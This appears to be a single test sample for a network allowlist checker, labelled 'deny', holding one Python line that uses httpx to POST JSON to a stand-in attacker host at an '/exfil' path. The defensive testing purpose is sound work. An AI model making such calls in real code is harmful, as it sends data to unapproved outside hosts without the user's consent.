# Sample 36: httpx.Client chain to non-allowlisted host (deny).
import httpx
httpx.Client().post("https://evil.example.com/exfil", json={"k": 1})
